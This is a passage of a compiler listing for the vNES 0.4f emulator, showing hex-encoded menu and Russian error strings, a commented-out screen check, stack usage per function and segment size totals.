   \   000003C0   2E46726D536B       DC8 2EH, 46H, 72H, 6DH, 53H, 6BH, 70H, 20H
   \              7020        
   \   000003C8   312D393A2564       DC8 31H, 2DH, 39H, 3AH, 25H, 64H, 0AH, 34H
   \              0A34        
   \   000003D0   2E4F7074696D       DC8 2EH, 4FH, 70H, 74H, 69H, 6DH, 69H, 7AH
   \              697A        
   \   000003D8   653A25640A35       DC8 65H, 3AH, 25H, 64H, 0AH, 35H, 2EH, 52H
   \              2E52        
   \   000003E0   65646566696E       DC8 65H, 64H, 65H, 66H, 69H, 6EH, 65H, 0AH
   \              650A        
   \   000003E8   362E5175616C       DC8 36H, 2EH, 51H, 75H, 61H, 6CH, 69H, 74H
   \              6974        
   \   000003F0   793A25640A37       DC8 79H, 3AH, 25H, 64H, 0AH, 37H, 2EH, 53H
   \              2E53        
   \   000003F8   637253746570       DC8 63H, 72H, 53H, 74H, 65H, 70H, 3AH, 25H
   \              3A25        
   \   00000400   3032640A382E       DC8 30H, 32H, 64H, 0AH, 38H, 2EH, 53H, 69H
   \              5369        
   \   00000408   7A65583A2530       DC8 7AH, 65H, 58H, 3AH, 25H, 30H, 33H, 64H
   \              3364        
   \   00000410   0A392E53697A       DC8 0AH, 39H, 2EH, 53H, 69H, 7AH, 65H, 59H
   \              6559        
   \   00000418   3A253033640A       DC8 3AH, 25H, 30H, 33H, 64H, 0AH, 30H, 2EH
   \              302E        
   \   00000420   457869740A63       DC8 45H, 78H, 69H, 74H, 0AH, 63H, 62H, 6EH
   \              626E        
   \   00000428   2E6E61726F64       DC8 2EH, 6EH, 61H, 72H, 6FH, 64H, 2EH, 72H
   \              2E72        
   \   00000430   750A63626E40       DC8 75H, 0AH, 63H, 62H, 6EH, 40H, 79H, 61H
   \              7961        
   \   00000438   6E6465782E72       DC8 6EH, 64H, 65H, 78H, 2EH, 72H, 75H, 0
   \              7500        

   \                                 In segment DATA_ID, align 4, align-sorted
   \                     `?<Initializer for Title>`:
   \   00000000   ........           DC32 `?<Constant "vNES 0.4f (c)bn">`

   \                                 In segment DATA_ID, align 4, align-sorted
   \                     `?<Initializer for errors>`:
   \   00000000   00000000....       DC32 0H, `?<Constant "\\307\\340\\357\\363\\361\\362\\350\\362\\3`
   \              ....        
   \   00000008   ........           DC32 `?<Constant "Unknown error\\000">`
   \   0000000C   ........           DC32 `?<Constant "\\315\\345 \\354\\356\\343\\363 \\356\\362`
   \   00000010   ........           DC32 `?<Constant "\\315\\345 .Nes \\360\\356\\354!\\000">`
   \   00000014   ........           DC32 `?<Constant "\\314\\340\\357\\357\\345\\360 \\355\\345 `
   \   00000018   ........           DC32 `?<Constant "\\315\\345\\342\\345\\360\\355\\373\\351 \\`

   \                                 In segment DATA_C, align 4, align-sorted
   \                     `?<Constant "vNES 0.4f (c)bn">`:
   \   00000000   764E45532030       DC8 "vNES 0.4f (c)bn"
   \              2E3466202863
   \              29626E00    

   \                                 In segment DATA_C, align 4, align-sorted
   \                     `?<Constant "\\307\\340\\357\\363\\361\\362\\350\\362\\3`:
   \   00000000   C7E0EFF3F1F2       DC8 0C7H, 0E0H, 0EFH, 0F3H, 0F1H, 0F2H, 0E8H, 0F2H
   \              E8F2        
   \   00000008   E5202E6E6573       DC8 0E5H, 20H, 2EH, 6EH, 65H, 73H, 20H, 0F4H
   \              20F4        
   \   00000010   E0E9EB0000         DC8 0E0H, 0E9H, 0EBH, 0, 0
   \   00000015   000000             DC8 0, 0, 0

   \                                 In segment DATA_C, align 4, align-sorted
   \                     `?<Constant "Unknown error\\000">`:
   \   00000000   556E6B6E6F77       DC8 55H, 6EH, 6BH, 6EH, 6FH, 77H, 6EH, 20H
   \              6E20        
   \   00000008   6572726F7200       DC8 65H, 72H, 72H, 6FH, 72H, 0, 0
   \              00          
   \   0000000F   00                 DC8 0

   \                                 In segment DATA_C, align 4, align-sorted
   \                     `?<Constant "\\315\\345 \\354\\356\\343\\363 \\356\\362`:
   \   00000000   CDE520ECEEE3       DC8 0CDH, 0E5H, 20H, 0ECH, 0EEH, 0E3H, 0F3H, 20H
   \              F320        
   \   00000008   EEF2EAF0FBF2       DC8 0EEH, 0F2H, 0EAH, 0F0H, 0FBH, 0F2H, 0FCH, 20H
   \              FC20        
   \   00000010   F4E0E9EB0000       DC8 0F4H, 0E0H, 0E9H, 0EBH, 0, 0
   \   00000016   0000               DC8 0, 0

   \                                 In segment DATA_C, align 4, align-sorted
   \                     `?<Constant "\\315\\345 .Nes \\360\\356\\354!\\000">`:
   \   00000000   CDE5202E4E65       DC8 0CDH, 0E5H, 20H, 2EH, 4EH, 65H, 73H, 20H
   \              7320        
   \   00000008   F0EEEC210000       DC8 0F0H, 0EEH, 0ECH, 21H, 0, 0
   \   0000000E   0000               DC8 0, 0

   \                                 In segment DATA_C, align 4, align-sorted
   \                     `?<Constant "\\314\\340\\357\\357\\345\\360 \\355\\345 `:
   \   00000000   CCE0EFEFE5F0       DC8 0CCH, 0E0H, 0EFH, 0EFH, 0E5H, 0F0H, 20H, 0EDH
   \              20ED        
   \   00000008   E520EFEEE4E4       DC8 0E5H, 20H, 0EFH, 0EEH, 0E4H, 0E4H, 0E5H, 0F0H
   \              E5F0        
   \   00000010   E6E8E2E0E5F2       DC8 0E6H, 0E8H, 0E2H, 0E0H, 0E5H, 0F2H, 0F1H, 0FFH
   \              F1FF        
   \   00000018   2E0000             DC8 2EH, 0, 0
   \   0000001B   00                 DC8 0

   \                                 In segment DATA_C, align 4, align-sorted
   \                     `?<Constant "\\315\\345\\342\\345\\360\\355\\373\\351 \\`:
   \   00000000   CDE5E2E5F0ED       DC8 0CDH, 0E5H, 0E2H, 0E5H, 0F0H, 0EDH, 0FBH, 0E9H
   \              FBE9        
   \   00000008   20F0EEEC2100       DC8 20H, 0F0H, 0EEH, 0ECH, 21H, 0, 0
   \              00          
   \   0000000F   00                 DC8 0

   \                                 In segment DATA_C, align 4, align-sorted
   \                     `?<Constant ".ini">`:
   \   00000000   2E696E6900         DC8 ".ini"
   \   00000005   000000             DC8 0, 0, 0
    448          //напутал....экран
    449          //        int i1 = getWidth;
    450          //        int j1 = getHeight;
    451          //        if(i1 != t_int_static_fld || j1 != K)
    452          //            i();
    453          //        t_int_static_fld = i1;
    454          //        K = j1;

   Maximum stack usage in bytes:

     Function      CSTACK
     --------      ------
     drawhelp         16
     drawsym           8
     getscrXY         12
     isFreeRam         0
     keyboard_init     8
     keypress         12
     loadini          20
     onclose           4
     oncreate          4
     onexit            4
     onkey            36
     onredraw          8
     onredslow        32
     onstart          12
     outmenu          20
     repaint           4
     saveini          16
     savename          8


   Segment part sizes:

     Function/Label                 Bytes
     --------------                 -----
     zfont                           772
     file                              4
     keyboard_init                    44
     drawsym                         124
     drawhelp                        168
     loadini                         152
     saveini                         120
     isFreeRam                        28
     keypress                        104
     plus                              4
     LastTmrVal                        4
     repaint                          12
     helpsel                          80
     version                           1
     param                          1088
     Title                             4
     errors                           28
     outmenu                          76
     onredslow                       180
     onredraw                        212
     getscrXY                        232
     savename                         52
     onkey                          1300
     onclose                          72
     onexit                            4
     oncreate                         48
     onstart                         192
     ??DataTable8                      4
     ??DataTable24                     4
     ??DataTable37                     4
     ??DataTable38                     4
     ??DataTable41                     4
     ??DataTable42                     4
     ??DataTable45                     4
     ??DataTable46                     4
     ??DataTable49                     4
     ??DataTable50                     4
     ??DataTable51                     4
     ??DataTable52                     4
     ??DataTable53                     4
     ?<Initializer for zfont>        772
     ?<Initializer for param>       1088
     ?<Initializer for Title>          4
     ?<Initializer for errors>        28
     ?<Constant "vNES 0.4f (c)bn">    16
     ?<Constant "\307\340\357\363\361\362\350\362\3
                                      24
     ?<Constant "Unknown error\000">
                                      16
     ?<Constant "\315\345 \354\356\343\363 \356\362
                                      24
     ?<Constant "\315\345 .Nes \360\356\354!\000">
                                      16
     ?<Constant "\314\340\357\357\345\360 \355\345
                                      28
     ?<Constant "\315\345\342\345\360\355\373\351 \
                                      16
     ?<Constant ".ini">                8
      Others                         252

 
 3 400 bytes in segment CODE
   229 bytes in segment DATA_C
 1 892 bytes in segment DATA_I
 1 892 bytes in segment DATA_ID
    12 bytes in segment DATA_Z
    24 bytes in segment INITTAB
 
 3 172 bytes of CODE  memory (+ 252 bytes shared)
 2 121 bytes of CONST memory
 1 904 bytes of DATA  memory

Errors: none
Warnings: none
